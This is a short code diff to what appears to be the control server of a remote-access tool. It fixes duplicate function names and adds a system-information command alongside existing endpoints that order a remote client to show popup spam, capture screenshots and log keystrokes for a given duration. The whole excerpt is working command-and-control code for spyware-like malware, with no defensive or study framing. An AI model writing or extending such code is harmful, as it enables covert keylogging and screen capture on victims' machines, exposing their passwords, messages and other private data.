@@ -64,7 +64,7 @@ def send_popup_spam_command(client_id: str, message: str) -> BasicResponse:
 
 
 @app.get("/screenshot")
-def send_popup_command(client_id: str) -> BasicResponse:
+def send_screenshot_command(client_id: str) -> BasicResponse:
     return make_command_request(
         SendCommandRequest(
             header=RequestHeader(
@@ -77,7 +77,7 @@ def send_popup_command(client_id: str) -> BasicResponse:
 
 
 @app.get("/keylog")
-def send_popup_command(client_id: str, duration: int) -> BasicResponse:
+def send_keylog_command(client_id: str, duration: int) -> BasicResponse:
     return make_command_request(
         SendCommandRequest(
             header=RequestHeader(
@@ -85,6 +85,19 @@ def send_popup_command(client_id: str, duration: int) -> BasicResponse:
                 request_type=RequestType.SendCommand
             ),
             content=SendCommandContent(command=KeyLogCommand(parameters=KeyLogParameters(duration=duration)))
+        )
+    )
+
+
+@app.get("/get-system-info")
+def send_get_system_info_command(client_id: str) -> BasicResponse:
+    return make_command_request(
+        SendCommandRequest(
+            header=RequestHeader(
+                client_id=client_id,
+                request_type=RequestType.SendCommand
+            ),
+            content=SendCommandContent(command=BasicCommand(command_type=CommandType.GetSystemInfo))
         )
     )
 
